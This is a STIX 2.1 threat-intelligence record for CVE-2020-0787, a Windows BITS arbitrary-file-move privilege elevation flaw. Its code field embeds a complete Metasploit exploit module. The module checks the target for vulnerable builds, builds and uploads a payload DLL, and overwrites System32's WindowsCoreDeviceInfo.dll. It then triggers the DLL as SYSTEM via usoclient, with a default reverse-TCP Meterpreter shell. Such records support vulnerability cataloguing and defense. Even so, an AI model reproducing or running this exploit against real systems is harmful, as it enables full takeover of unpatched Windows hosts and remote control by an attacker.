{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3a7196c2-3c76-47cc-b16a-b578d5b8c7b3",
    "created": "2024-08-14T16:50:07.215571Z",
    "modified": "2024-08-14T16:50:07.215575Z",
    "name": "Background Intelligent Transfer Service Arbitrary File Move Privilege Elevation Vulnerability",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/cve_2020_0787_bits_arbitrary_file_move.rb",
            "external_id": "cve_2020_0787_bits_arbitrary_file_move.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-0787"
        },
        {
            "source_name": "reference",
            "url": "https://itm4n.github.io/cve-2020-0787-windows-bits-eop/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/itm4n/BitsArbitraryFileMove"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/assessments/e61cfec0-d766-4e7e-89f7-5aad2460afb8"
        },
        {
            "source_name": "reference",
            "url": "https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html"
        },
        {
            "source_name": "reference",
            "url": "https://itm4n.github.io/usodllloader-part1/"
        },
        {
            "source_name": "reference",
            "url": "https://itm4n.github.io/usodllloader-part2/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Version\n  include Msf::Exploit::EXE # Needed for generate_payload_dll\n  include Msf::Post::Windows::FileSystem\n  include Msf::Post::Windows::Process\n  include Msf::Post::Windows::ReflectiveDLLInjection\n  include Msf::Exploit::FileDropper\n  include Msf::Post::File\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Background Intelligent Transfer Service Arbitrary File Move Privilege Elevation Vulnerability',\n        'Description' => %q{\n          This module exploits CVE-2020-0787, an arbitrary file move vulnerability in outdated versions of the\n          Background Intelligent Transfer Service (BITS), to overwrite C:\\Windows\\System32\\WindowsCoreDeviceInfo.dll\n          with a malicious DLL containing the attacker's payload.\n\n          To achieve code execution as the SYSTEM user, the Update Session Orchestrator service is then started, which\n          will result in the malicious WindowsCoreDeviceInfo.dll being run with SYSTEM privileges due to a DLL hijacking\n          issue within the Update Session Orchestrator Service.\n\n          Note that presently this module only works on Windows 10 and Windows Server 2016 and later as the\n          Update Session Orchestrator Service was only introduced in Windows 10. Note that only Windows 10 has been tested,\n          so your mileage may vary on Windows Server 2016 and later.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'itm4n', # PoC\n          'gwillcox-r7' # msf module\n        ],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Privileged' => true,\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'Targets' => [\n          [ 'Windows DLL Dropper', { 'Arch' => [ARCH_X86, ARCH_X64], 'Type' => :windows_dropper } ],\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2020-03-10',\n        'References' => [\n          ['CVE', '2020-0787'],\n          ['URL', 'https://itm4n.github.io/cve-2020-0787-windows-bits-eop/'],\n          ['URL', 'https://github.com/itm4n/BitsArbitraryFileMove'],\n          ['URL', 'https://attackerkb.com/assessments/e61cfec0-d766-4e7e-89f7-5aad2460afb8'],\n          ['URL', 'https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html'],\n          ['URL', 'https://itm4n.github.io/usodllloader-part1/'],\n          ['URL', 'https://itm4n.github.io/usodllloader-part2/'],\n        ],\n        'Notes' => {\n          'SideEffects' => [ ARTIFACTS_ON_DISK ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability' => [ CRASH_SAFE ]\n        },\n        'DefaultOptions' => {\n          'EXITFUNC' => 'thread',\n          'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp',\n          'WfsDelay' => 900\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_config_getenv\n            ]\n          }\n        }\n      )\n    )\n\n    register_options([\n      OptBool.new('OVERWRITE_DLL', [true, 'Overwrite WindowsCoreDeviceInfo.dll if it exists (false by default).', false]),\n      OptInt.new('JOB_WAIT_TIME', [true, 'Time to wait for the BITS job to complete before starting the USO service to execute the uploaded payload, in seconds', 20])\n    ])\n  end\n\n  def target_not_presently_supported\n    print_warning('This target is not presently supported by this exploit. Support may be added in the future!')\n    print_warning('Attempts to exploit this target with this module WILL NOT WORK!')\n  end\n\n  def check\n    sysinfo_value = sysinfo['OS']\n    if sysinfo_value !~ /windows/i\n      # Non-Windows systems are definitely not affected.\n      return CheckCode::Safe('Target is not a Windows system, so it is not affected by this vulnerability!')\n    end\n\n    # see https://docs.microsoft.com/en-us/windows/release-information/\n    version = get_version_info\n    unless version.build_number.between?(Msf::WindowsVersion::Server2008_SP0, Msf::WindowsVersion::Win10_1909)\n      return CheckCode::Safe('Target is not running a vulnerable version of Windows!')\n    end\n\n    # Build numbers taken from https://www.qualys.com/research/security-alerts/2020-03-10/microsoft/\n    if version.build_number == Msf::WindowsVersion::Win10_1909 && version.build_number.revision_number.between?(0, 718)\n      return CheckCode::Appears('Vulnerable Windows 10 v1909 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_1903 && version.build_number.revision_number.between?(0, 718)\n      return CheckCode::Appears('Vulnerable Windows 10 v1903 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_1809 && version.build_number.revision_number.between?(0, 1097)\n      return CheckCode::Appears('Vulnerable Windows 10 v1809 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_1803 && version.build_number.revision_number.between?(0, 1364)\n      return CheckCode::Appears('Vulnerable Windows 10 v1803 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_1709 && version.build_number.revision_number.between?(0, 1746)\n      return CheckCode::Appears('Vulnerable Windows 10 v1709 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_1703 && version.build_number.revision_number.between?(0, 2312)\n      return CheckCode::Appears('Vulnerable Windows 10 v1703 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_1607 && version.build_number.revision_number.between?(0, 3563)\n      return CheckCode::Appears('Vulnerable Windows 10 v1607 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_1511\n      return CheckCode::Appears('Vulnerable Windows 10 v1511 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_1507 && version.build_number.revision_number.between?(0, 18518)\n      return CheckCode::Appears('Vulnerable Windows 10 v1507 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win81 # Includes Server 2012 R2\n      target_not_presently_supported\n      return CheckCode::Detected('Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win8 # Includes Server 2012\n      target_not_presently_supported\n      return CheckCode::Detected('Vulnerable Windows 8/Windows Server 2012 build detected!')\n    elsif version.build_number.between?(Msf::WindowsVersion::Win7_SP0, Msf::WindowsVersion::Win7_SP1) # Includes Server 2008 R2\n      target_not_presently_supported\n      return CheckCode::Detected('Vulnerable Windows 7/Windows Server 2008 R2 build detected!')\n    elsif version.build_number.between?(Msf::WindowsVersion::Server2008_SP0, Msf::WindowsVersion::Server2008_SP2_Update) # Includes Server 2008\n      target_not_presently_supported\n      return CheckCode::Detected('Windows Windows Server 2008 build detected!')\n    else\n      return CheckCode::Safe('The build number of the target machine does not appear to be a vulnerable version!')\n    end\n  end\n\n  def check_target_is_running_supported_windows_version\n    if sysinfo['OS'].match('Windows').nil?\n      fail_with(Failure::NotVulnerable, 'Target is not running Windows!')\n    elsif get_version_info.build_number < Msf::WindowsVersion::Win10_InitialRelease\n      fail_with(Failure::BadConfig, 'Target is running Windows, its not a version this module supports! Bailing...')\n    end\n  end\n\n  def check_target_and_payload_match_and_supported(client_arch)\n    if (client_arch != ARCH_X64) && (client_arch != ARCH_X86)\n      fail_with(Failure::BadConfig, 'This exploit currently only supports x86 and x64 targets!')\n    end\n    payload_arch = payload.arch.first # TODO: Add missing documentation for payload.arch, @wvu used this first but it is not documented anywhere.\n    if (payload_arch != ARCH_X64) && (payload_arch != ARCH_X86)\n      fail_with(Failure::BadConfig, \"Unsupported payload architecture (#{payload_arch})\") # Unsupported architecture, so return an error.\n    end\n    if ((client_arch == ARCH_X64) && (payload_arch != ARCH_X64)) || ((client_arch == ARCH_X86) && (payload_arch != ARCH_X86))\n      fail_with(Failure::BadConfig, \"Payload architecture (#{payload_arch}) doesn't match the architecture of the target (#{client_arch})!\")\n    end\n  end\n\n  def check_windowscoredeviceinfo_dll_exists_on_target\n    # Taken from bwatters-r7's cve-2020-0688_service_tracing.rb code.\n    #\n    # We are going to overwrite the WindowsCoreDeviceInfo.dll DLL as part of our exploit.\n    # The second part of this exploit will trigger a Update Session to be created so that this DLL\n    # is loaded, which will result in arbitrary code execution as SYSTEM.\n    #\n    # To prevent any errors, we will first check that this file doesn't exist and ask the user if they are sure\n    # that they want to overwrite the file.\n    win_dir = session.sys.config.getenv('windir')\n    normal_target_payload_pathname = \"#{win_dir}\\\\System32\\\\WindowsCoreDeviceInfo.dll\"\n    wow64_target_payload_pathname = \"#{win_dir}\\\\Sysnative\\\\WindowsCoreDeviceInfo.dll\"\n    wow64_existing_file = \"#{win_dir}\\\\Sysnative\\\\win32k.sys\"\n    if file?(wow64_existing_file)\n      if file?(wow64_target_payload_pathname)\n        print_warning(\"#{wow64_target_payload_pathname} already exists\")\n        print_warning('If it is in use, the overwrite will fail')\n        unless datastore['OVERWRITE_DLL']\n          print_error('Change OVERWRITE_DLL option to true if you would like to proceed.')\n          fail_with(Failure::BadConfig, \"#{wow64_target_payload_pathname} already exists and OVERWRITE_DLL option is false\")\n        end\n      end\n      target_payload_pathname = wow64_target_payload_pathname\n    elsif file?(normal_target_payload_pathname)\n      print_warning(\"#{normal_target_payload_pathname} already exists\")\n      print_warning('If it is in use, the overwrite will fail')\n      unless datastore['OVERWRITE_DLL']\n        print_error('Change OVERWRITE_DLL option to true if you would like to proceed.')\n        fail_with(Failure::BadConfig, \"#{normal_target_payload_pathname} already exists and OVERWRITE_DLL option is false\")\n      end\n      target_payload_pathname = normal_target_payload_pathname\n    end\n    target_payload_pathname\n  end\n\n  def exploit\n    # Step 1: Check target environment is correct.\n    print_status('Step #1: Checking target environment...')\n    if is_system?\n      fail_with(Failure::None, 'Session is already elevated')\n    end\n    client_arch = sysinfo['Architecture']\n    check_target_is_running_supported_windows_version\n    check_target_and_payload_match_and_supported(client_arch)\n    check_windowscoredeviceinfo_dll_exists_on_target\n\n    # Step 2: Generate the malicious DLL and upload it to a temp location.\n    print_status('Step #2: Generating the malicious DLL...')\n    path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2020-0787')\n    datastore['EXE::Path'] = path\n    if client_arch =~ /x86/i\n      datastore['EXE::Template'] = ::File.join(path, 'template_x86_windows.dll')\n      library_path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2020-0787', 'CVE-2020-0787.x86.dll')\n      library_path = ::File.expand_path(library_path)\n    elsif client_arch =~ /x64/i\n      datastore['EXE::Template'] = ::File.join(path, 'template_x64_windows.dll')\n      library_path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2020-0787', 'CVE-2020-0787.x64.dll')\n      library_path = ::File.expand_path(library_path)\n    end\n\n    payload_dll = generate_payload_dll\n    print_status(\"Payload DLL is #{payload_dll.length} bytes long\")\n    temp_directory = session.sys.config.getenv('%TEMP%')\n    malicious_dll_location = \"#{temp_directory}\\\\#{Rex::Text.rand_text_alpha(6..13)}.dll\"\n    write_file(malicious_dll_location, payload_dll)\n    register_file_for_cleanup(malicious_dll_location)\n\n    # Step 3: Load the main DLL that will trigger the exploit and conduct the arbitrary file copy.\n    print_status('Step #3: Loading the exploit DLL to run the main exploit...')\n    dll_info_parameter = malicious_dll_location.to_s\n\n    # invoke the exploit, passing in the address of the payload that\n    # we want invoked on successful exploitation.\n    execute_dll(library_path, dll_info_parameter)\n\n    print_status(\"Sleeping for #{datastore['JOB_WAIT_TIME']} seconds to allow the exploit to run...\")\n    sleep datastore['JOB_WAIT_TIME']\n\n    register_file_for_cleanup('C:\\\\Windows\\\\System32\\\\WindowsCoreDeviceInfo.dll') # Register this file for cleanup so that if we fail, then the file is cleaned up.\n    # Normally we can't delete this file though as there will be a SYSTEM service that has a handle to this file.\n\n    print_status('Starting the interactive scan job...')\n    # Step 4: Execute `usoclient StartInteractiveScan` to trigger the payload\n    # XXX Using session.shell_command_token over cmd_exec() here as @wvu-r7 noticed cmd_exec() was broken under some situations.\n    session.shell_command_token('usoclient StartInteractiveScan')\n\n    print_status('Enjoy the shell!')\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2020-03-10",
    "x_mitre_platforms": [
        "['win']"
    ]
}